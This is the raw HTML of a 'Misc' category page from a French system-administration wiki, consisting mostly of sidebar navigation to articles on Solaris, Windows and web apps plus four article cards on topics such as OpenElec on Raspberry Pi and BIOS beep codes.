href=https://wiki.deimos.fr/PHP_:_Installation_et_configuration/>PHP: Installation and Configuration</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cr%C3%A9er_une_favicon_pour_un_site_web/>Creating a Favicon for a Website</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/preventing_indexed_website/>Preventing your website from being indexed (disabling robot scans)</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Tester_le_load_sur_ses_serveurs_et_applications_web/>Testing Load on Servers and Web Applications</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Trac_:_Mise_en_place_d%27une_solution_de_Tracking/>Trac: Setting up a Tracking Solution</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Acc%C3%A9l%C3%A9rer_les_scripts_CGI_avec_SpeedyCGI-PersistantPerl/>Accelerating CGI Scripts with SpeedyCGI-PersistantPerl</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Webapps</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
MediaWiki</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/MediaWiki:Installation_et_configuration/>MediaWiki: Installation and Configuration</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Les_extentions_pratiques_de_Mediawiki/>Practical Extensions for MediaWiki</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Utilisation_basique_de_Mediawiki/>Basic Usage of MediaWiki</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
RSS feeder</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Tiny_Tiny_RSS_:_Une_alternative_%C3%A0_Google_Reader/>Tiny Tiny RSS: An Alternative to Google Reader</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Selfoss_:_An_elegant_RSS_reader/>Selfoss: An Elegant RSS Reader</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Wordpress</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Utilisation_avanc%C3%A9e_de_Wordpress/>Advanced WordPress Usage</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Wordpress_:_les_extentions_pratiques/>WordPress: Useful Extensions</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_de_Memcached_sur_Wordpress/>Setting up Memcached on WordPress</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Piwik_:_Des_statistiques_pour_votre_site_web/>Piwik: Statistics for Your Website</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Pootle_:_simple_translation_tool/>Pootle: Simple Translation Tool</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Bugzilla_:_mise_en_place_d%27un_outil_de_ticketing/>Bugzilla: Setting Up a Ticketing Tool</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Jenkins_:_Mise_en_place_d%27un_outil_d%27int%C3%A9gration_continue/>Jenkins: Setting up a continuous integration tool</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Limesurvey_:_Mise_en_place_d%27une_solution_de_Sondages/>Limesurvey: Setting up a Survey Solution</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OTRS_:_mise_en_place_d%27un_outil_de_ticketing/>OTRS: Setting up a ticketing tool</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/MyTinyTodo_:_Un_outil_simple_de_gestion_de_t%C3%A2ches/>MyTinyTodo: A Simple Task Management Tool</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/ajaxterm-utiliser-un-terminal-en-web/>Ajaxterm: Using a Terminal via Web</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Awstats_:_Mise_en_place_d%27Awstats,_interpr%C3%A9teur_de_logs_web/>Awstats: Setting up Awstats, a Web Logs Interpreter</a></li></ul></div></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">host</i>
Solaris</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Applications</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Services</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/SMF_:_Service_Management_Facility/>SMF: Service Management Facility</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Convertir_le_script_RC_de_MySQL_vers_un_SMF/>Convert MySQL RC Script to SMF</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Users management</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Gestion_des_utilisateurs/>User Management</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_du_client_OpenLDAP/>Setting up OpenLDAP Client</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Jumpstart:_automatiser_les_installations_Solaris_sans_r%C3%A9seaux/>Jumpstart: Automating Solaris Installations Without Networks</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/DTrace_:_d%C3%A9tection_de_probl%C3%A8mes_en_temps_r%C3%A9el/>DTrace: Real-time Problem Detection</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_de_vncserver_sur_Solaris/>Setting up VNC server on Solaris</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Utiliser_la_webconsole/>Using the Web Console</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_de_Nagios_NRPE_sur_Solaris_10/>Setting up Nagios NRPE on Solaris 10</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/SSH_:_Mise_en_place_du_serveur_SSH_Solaris_sur_une_installation_minimale/>SSH: Setting up SSH Server on a Minimal Solaris Installation</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Filesystems</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/ZFS_:_Le_FileSystem_par_excellence/>ZFS: The Filesystem Par Excellence</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Tmpfs_:_monter_un_filesystem_en_RAM_sous_Solaris/>Tmpfs: Mounting a RAM filesystem on Solaris</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/ajout-de-swap-sous-solaris/>Adding Swap Space on Solaris</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Management_des_disques_sous_Solaris/>Disk Management in Solaris</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Monter_une_image_ISO_sous_Solaris/>Mount an ISO image on Solaris</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/ACL_Implementation_droits_type_NT_sur_Solaris/>ACL: Implementing NT-Style Permissions on Solaris</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Multipathing_management_on_Solaris/>Multipathing Management on Solaris</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Creation_d%27un_Raid_1_%28mirroring%29_sous_Solaris/>Creating a RAID 1 (mirroring) on Solaris</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Hardware</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Connaitre_le_nombre_de_cores_CPU_actifs_sur_Solaris/>How to Check the Number of Active CPU Cores on Solaris</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Misc</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Trouver_le_process_qui_tourne_sur_un_certain_port_sur_Solaris/>Finding a Process Running on a Specific Port on Solaris</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Manager_les_processes_Solaris/>Managing Solaris Processes</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Changer_les_locales_de_Solaris/>Changing Solaris Locales</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Monitorer_les_acc%C3%A8s_au_superuser/>Monitoring Superuser Access</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Changer_le_hostname_de_sa_solaris/>Changing Hostname on Solaris</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Enlever_les_limitation_utilisateurs/>Removing User Limitations</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Connaitre_son_architecture/>How to Determine Your System Architecture</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Quelques_infos_sur_la_b%C3%A9cane/>Some information about the machine</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Obtenir_l%27heure_au_format_Unix_sous_Solaris/>Get Unix Format Time on Solaris</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Monitorer_ses_Solaris_Users/>Monitor Your Solaris Users</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OpenBoot_PROM,_gestion_du_%22BIOS%22/>OpenBoot PROM, BIOS Management</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Patcher_sa_Solaris/>Patching Solaris</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Network</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Configurer_le_r%C3%A9seau_sur_Solaris/>Configure Network on Solaris</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Configuration_de_l%27IPMP/>IPMP Configuration</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Modifier_les_param%C3%A8tres_des_cartes_r%C3%A9seaux/>Modifying Network Card Parameters</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/make-unsupported-network-cards-work-with-solaris/>Make Unsupported Network Cards Work with Solaris</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Packages</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Pkg-get_:_Mise_en_place_d%27un_syst%C3%A8me_de_repository_pour_Solaris/>Pkg-get: Setting up a Repository System for Solaris</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Automatiser_l%27installation_de_beaucoup_de_packages/>Automating Installation of Many Packages</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Gestion_des_packages_Solaris/>Solaris Package Management</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/G%C3%A9rer_ses_updates_avec_Update_Manager_et_smpatch/>Managing Updates with Update Manager and smpatch</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cr%C3%A9er_un_package_Solaris/>Creating a Solaris Package</a></li></ul></div></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">article</i>
Windows</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Applications</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/WinDbg:_analyze_crash_dump/>WinDbg: Analyze Crash Dump</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installer_Rsync_sur_Windows/>Installing Rsync on Windows</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Misc</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Modifier_les_serveurs_de_synchronisation_NTP_sous_Windows/>Modifying NTP Synchronization Servers on Windows</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/D%C3%A9ployement_de_la_gestion_d%27%C3%A9nergie_sur_un_serveur_pour_ses_clients/>Deploying Power Management on a Server for its Clients</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OpenSSH:_Using_Putty_and_an_HTTP_proxy_to_ssh_anywhere_through_firewalls/>OpenSSH: Using Putty and an HTTP proxy to ssh anywhere through firewalls</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Windows_XP_:_Probl%C3%A8mes_lors_d%27un_d%C3%A9passement_m%C3%A9moire/>Windows XP: Memory Overflow Problems</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/WSUS_:_faire_gagner_de_l%27espace_disque_%28purge_des_mises_%C3%A0_jour_inutilis%C3%A9es%29/>WSUS: Save Disk Space (Purge Unused Updates)</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Windows_:_Arr%C3%A9ter_un_arret_du_syst%C3%A8me_en_cours/>Windows: Stop a system shutdown in progress</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Windows_:_Rafra%C3%AEchir_les_politiques_de_s%C3%A9curit%C3%A9_%28GPO%29/>Windows: Refreshing Security Policies (GPO)</a></li></ul></div></li></ul></div></li></ul></div><ul class="sidebar-footer list-unstyled mb-0"></ul></nav><main class="page-content bg-transparent"><div id=top-header class="top-header d-print-none"><div class="header-bar d-flex justify-content-between"><div class="d-flex align-items-center"><a href=/ class="logo-icon me-3" aria-label=HomePage alt=HomePage><div class=small><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div><div class=big><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div></a><button id=close-sidebar class="btn btn-icon btn-soft">
<span class="material-icons size-20 menu-icon align-middle">menu</span>
</button>
<button id=flexsearch-button class="ms-3 btn btn-soft" data-bs-toggle=collapse data-bs-target=#FlexSearchCollapse aria-expanded=false aria-controls=FlexSearchCollapse>
<span class="material-icons size-20 menu-icon align-middle">search</span>
<span class="flexsearch-button-placeholder ms-1 me-2 d-none d-sm-block">Search</span><div class="d-none d-sm-block"><span class=flexsearch-button-keys><kbd class=flexsearch-button-cmd-key><svg width="44" height="15"><path d="M2.118 11.5A1.519 1.519.0 011 11.042 1.583 1.583.0 011 8.815a1.519 1.519.0 011.113-.458h.715V6.643h-.71A1.519 1.519.0 011 6.185 1.519 1.519.0 01.547 5.071 1.519 1.519.0 011 3.958 1.519 1.519.0 012.118 3.5a1.519 1.519.0 011.114.458A1.519 1.519.0 013.69 5.071v.715H5.4V5.071A1.564 1.564.0 016.976 3.5 1.564 1.564.0 018.547 5.071 1.564 1.564.0 016.976 6.643H6.261V8.357h.715a1.575 1.575.0 011.113 2.685 1.583 1.583.0 01-2.227.0A1.519 1.519.0 015.4 9.929V9.214H3.69v.715a1.519 1.519.0 01-.458 1.113A1.519 1.519.0 012.118 11.5zm0-.857a.714.714.0 00.715-.714V9.214H2.118a.715.715.0 100 1.429zm4.858.0a.715.715.0 100-1.429H6.261v.715a.714.714.0 00.715.714zM3.69 8.357H5.4V6.643H3.69zM2.118 5.786h.715V5.071a.714.714.0 00-.715-.714.715.715.0 00-.5 1.22A.686.686.0 002.118 5.786zm4.143.0h.715a.715.715.0 00.5-1.22.715.715.0 00-1.22.5z" fill="currentcolor"/><path d="M12.4 11.475H11.344l3.879-7.95h1.056z" fill="currentcolor"/><path d="M25.073 5.384l-.864.576a2.121 2.121.0 00-1.786-.923 2.207 2.207.0 00-2.266 2.326 2.206 2.206.0 002.266 2.325 2.1 2.1.0 001.782-.918l.84.617a3.108 3.108.0 01-2.622 1.293 3.217 3.217.0 01-3.349-3.317 3.217 3.217.0 013.349-3.317A3.046 3.046.0 0125.073 5.384z" fill="currentcolor"/><path d="M30.993 5.142h-2.07v5.419H27.891V5.142h-2.07V4.164h5.172z" fill="currentcolor"/><path d="M34.67 4.164c1.471.0 2.266.658 2.266 1.851.0 1.087-.832 1.809-2.134 1.855l2.107 2.691h-1.28L33.591 7.87H33.07v2.691H32.038v-6.4zm-1.6.969v1.8h1.572c.832.0 1.22-.3 1.22-.918s-.411-.882-1.22-.882z" fill="currentcolor"/><path d="M42.883 10.561H38.31v-6.4h1.033V9.583h3.54z" fill="currentcolor"/></svg>
</kbd><kbd class=flexsearch-button-key><svg width="15" height="15"><path d="M5.926 12.279H4.41L9.073 2.721H10.59z" fill="currentcolor"/></svg></kbd></span></div></button></div><div class="d-flex align-items-center"><ul class="list-unstyled mb-0"><li class="list-inline-item mb-0"><a href=https://github.com/deimosfr alt=github rel="noopener noreferrer" target=_blank><div class="btn btn-icon btn-default border-0"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>GitHub</title><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></div></a></li><li class="list-inline-item mb-0"><a href=https://twitter.com/deimosfr alt=twitter rel="noopener noreferrer" target=_blank><div class="btn btn-icon btn-default border-0"><svg width="24" height="24" viewBox="0 0 24 24"><title>Twitter / X</title><path d="M.088.768l9.266 12.39L.029 23.231h2.1l8.163-8.819 6.6 8.819h7.142L14.242 10.145 22.921.768h-2.1L13.3 8.891 7.229.768zM3.174 2.314H6.455L20.942 21.685h-3.28z" fill="currentcolor"/></svg></div></a></li><li class="list-inline-item mb-0"><a href=https://wiki.deimos.fr/index.xml alt=rss rel="noopener noreferrer" target=_blank><div class="btn btn-icon btn-default border-0"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>RSS</title><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></div></a></li></ul><button id=mode class="btn btn-icon btn-default ms-2" type=button aria-label="Toggle user interface mode">
<span class=toggle-dark><svg height="30" width="30" viewBox="0 0 48 48" fill="currentcolor"><title>Enable dark mode</title><path d="M24 42q-7.5.0-12.75-5.25T6 24t5.25-12.75T24 6q.4.0.85.025.45.025 1.15.075-1.8 1.6-2.8 3.95t-1 4.95q0 4.5 3.15 7.65Q28.5 25.8 33 25.8q2.6.0 4.95-.925T41.9 22.3q.05.6.075.975Q42 23.65 42 24q0 7.5-5.25 12.75T24 42zm0-3q5.45.0 9.5-3.375t5.05-7.925q-1.25.55-2.675.825Q34.45 28.8 33 28.8q-5.75.0-9.775-4.025T19.2 15q0-1.2.25-2.575t.9-3.125q-4.9 1.35-8.125 5.475Q9 18.9 9 24q0 6.25 4.375 10.625T24 39zm-.2-14.85z"/></svg>
</span><span class=toggle-light><svg height="30" width="30" viewBox="0 0 48 48" fill="currentcolor"><title>Enable light mode</title><path d="M24 31q2.9.0 4.95-2.05T31 24t-2.05-4.95T24 17t-4.95 2.05T17 24t2.05 4.95T24 31zm0 3q-4.15.0-7.075-2.925T14 24t2.925-7.075T24 14t7.075 2.925T34 24t-2.925 7.075T24 34zM3.5 25.5q-.65.0-1.075-.425Q2 24.65 2 24t.425-1.075Q2.85 22.5 3.5 22.5h5q.65.0 1.075.425Q10 23.35 10 24t-.425 1.075T8.5 25.5zm36 0q-.65.0-1.075-.425Q38 24.65 38 24t.425-1.075T39.5 22.5h5q.65.0 1.075.425Q46 23.35 46 24t-.425 1.075-1.075.425zM24 10q-.65.0-1.075-.425Q22.5 9.15 22.5 8.5v-5q0-.65.425-1.075Q23.35 2 24 2t1.075.425T25.5 3.5v5q0 .65-.425 1.075Q24.65 10 24 10zm0 36q-.65.0-1.075-.425T22.5 44.5v-5q0-.65.425-1.075Q23.35 38 24 38t1.075.425.425 1.075v5q0 .65-.425 1.075Q24.65 46 24 46zM12 14.1l-2.85-2.8q-.45-.45-.425-1.075.025-.625.425-1.075.45-.45 1.075-.45t1.075.45L14.1 12q.4.45.4 1.05.0.6-.4 1-.4.45-1.025.45T12 14.1zm24.7 24.75L33.9 36q-.4-.45-.4-1.075t.45-1.025q.4-.45 1-.45t1.05.45l2.85 2.8q.45.45.425 1.075-.025.625-.425 1.075-.45.45-1.075.45t-1.075-.45zM33.9 14.1q-.45-.45-.45-1.05.0-.6.45-1.05l2.8-2.85q.45-.45 1.075-.425.625.025 1.075.425.45.45.45 1.075t-.45 1.075L36 14.1q-.4.4-1.025.4t-1.075-.4zM9.15 38.85q-.45-.45-.45-1.075t.45-1.075L12 33.9q.45-.45 1.05-.45.6.0 1.05.45.45.45.45 1.05.0.6-.45 1.05l-2.8 2.85q-.45.45-1.075.425-.625-.025-1.075-.425zM24 24z"/></svg></span></button></div></div><div class=collapse id=FlexSearchCollapse><div class=flexsearch-container><div class=flexsearch-keymap><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd>
<kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd>
<span class=flexsearch-key-label>to navigate</span></li><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd>
<span class=flexsearch-key-label>to select</span></li><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd>
<span class=flexsearch-key-label>to close</span></li></div><form class="flexsearch position-relative flex-grow-1 ms-2 me-2"><div class="d-flex flex-row"><input id=flexsearch class=form-control type=search placeholder=Search aria-label=Search autocomplete=off>
<button id=hideFlexsearch type=button class="ms-2 btn btn-soft">
cancel</button></div><div id=suggestions class="shadow rounded-1 d-none"></div></form></div></div></div><div class=container-fluid><div class=layout-spacing><div class="d-md-flex justify-content-between align-items-center"><nav aria-label=breadcrumb class="d-inline-block pb-2 mt-1 mt-sm-0"><ul id=breadcrumbs class="breadcrumb bg-transparent mb-0" itemscope itemtype=https://schema.org/BreadcrumbList><li class="breadcrumb-item text-capitalize active" aria-current=page itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/home/><i class="material-icons size-20 align-text-bottom" itemprop=name>Home</i>
</a><meta itemprop=position content='1'></li><li class="breadcrumb-item text-capitalize" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/misc/><span itemprop=name>Misc</span>
</a><meta itemprop=position content='2'></li><li class="breadcrumb-item text-capitalize active" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><span itemprop=name>Misc</span>
<meta itemprop=position content='3'></li></ul></nav></div><div class="row flex-xl-nowrap"><div class="docs-toc col-xl-3 visually-hidden visually-hidden d-xl-block"><toc><div class="fw-bold text-uppercase mb-2">On this page</div><nav id=TableOfContents></nav></toc></div><div class="docs-toc-mobile visually-hidden visually-hidden d-print-none d-xl-none"><button id=toc-dropdown-btn class="btn-secondary dropdown-toggle" type=button data-bs-toggle=dropdown data-bs-offset=0,0 aria-expanded=false>
Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-content col-12 mt-0"><div class="mb-0 d-flex"><h1 class="content-title mb-0">Misc</h1></div><div id=content class=main-content><div class="row flex-xl-wrap"><div id=list-item class="col-md-4 col-12 mt-4 pt-2"><a class="text-decoration-none text-reset" href=https://wiki.deimos.fr/OpenElec_:_Solution_multimedia_pour_Raspberry_Pi/><div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1"><span class="icon-color d-flex my-3"><i class="material-icons align-middle">article</i></span><div class="card-body p-0 content"><p class="fs-5 fw-semibold card-title mb-1">OpenElec: Multimedia Solution for Raspberry Pi</p><p class="para card-text mb-0">Guide on installing and configuring OpenElec multimedia center on Raspberry Pi with support for …</p></div></div></a></div><div id=list-item class="col-md-4 col-12 mt-4 pt-2"><a class="text-decoration-none text-reset" href=https://wiki.deimos.fr/R%C3%A9parer_une_video_d%27une_GoPro_Hero/><div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1"><span class="icon-color d-flex my-3"><i class="material-icons align-middle">article</i></span><div class="card-body p-0 content"><p class="fs-5 fw-semibold card-title mb-1">Repairing a GoPro Hero Video</p><p class="para card-text mb-0">How to repair a corrupted GoPro Hero video file and recover the video content without audio.</p></div></div></a></div><div id=list-item class="col-md-4 col-12 mt-4 pt-2"><a class="text-decoration-none text-reset" href=https://wiki.deimos.fr/Rebooter_sa_Freebox_Server_6_en_ligne_de_commande/><div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1"><span class="icon-color d-flex my-3"><i class="material-icons align-middle">article</i></span><div class="card-body p-0 content"><p class="fs-5 fw-semibold card-title mb-1">Reboot Your Freebox Server 6 via Command Line</p><p class="para card-text mb-0">A guide on how to reboot your Freebox Server 6 from the command line, including installation …</p></div></div></a></div><div id=list-item class="col-md-4 col-12 mt-4 pt-2"><a class="text-decoration-none text-reset" href=https://wiki.deimos.fr/Signification_des_bips_%C3%A9mis_par_le_Bios/><div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1"><span class="icon-color d-flex my-3"><i class="material-icons align-middle">article</i></span><div class="card-body p-0 content"><p class="fs-5 fw-semibold card-title mb-1">BIOS Beep Codes and Their Meanings</p><p class="para card-text mb-0">A comprehensive guide to understanding the meaning of various BIOS beep codes during computer …</p></div></div></a></div></div></div><div><hr class=doc-hr><div id=doc-nav class=d-print-none></div></div></div></div></div></div><footer class="shadow py-3 d-print-none"><div class=container-fluid><div class="row align-items-center"><div class=col><div class="text-sm-start text-center mx-md-2"><p class=mb-0></p></div></div></div></div></footer></main></div></div><button onclick=topFunction() id=back-to-top aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12 10.224l-6.3 6.3-1.38-1.372L12 7.472l7.68 7.68-1.38 1.376z" style="fill:#fff"/></svg></button>
<script>(()=>{var e=document.getElementById("mode");e!==null&&(window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{e.matches?(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")):(localStorage.setItem("theme","light"),document.documentElement.removeAttribute("data-dark-mode"))}),e.addEventListener("click",()=>{document.documentElement.toggleAttribute("data-dark-mode"),localStorage.setItem("theme",document.documentElement.hasAttribute("data-dark-mode")?"dark":"light")}),localStorage.getItem("theme")==="dark"?document.documentElement.setAttribute("data-dark-mode",""):document.documentElement.removeAttribute("data-dark-mode"))})()</script><script src=/docs/js/bootstrap.c7927bdd82eceb076739257add3f4b0e11379da037c07d5c7110daeb6de0e3edcb2de867604550f88815157e4ec4ddb7.js integrity=sha384-x5J73YLs6wdnOSV63T9LDhE3naA3wH1ccRDa623g4+3LLehnYEVQ+IgVFX5OxN23 defer></script><script type=text/javascript src=https://wiki.deimos.fr/docs/js/bundle.min.5b09914df1ce37d91f00d10d38469bdaff5b2cc6fbe19e5f769c0fd425f46cd0318b3ede40d4bbfa9eb540d5f97d701b.js integrity=sha384-WwmRTfHON9kfANENOEab2v9bLMb74Z5fdpwP1CX0bNAxiz7eQNS7+p61QNX5fXAb crossorigin=anonymous defer></script><script 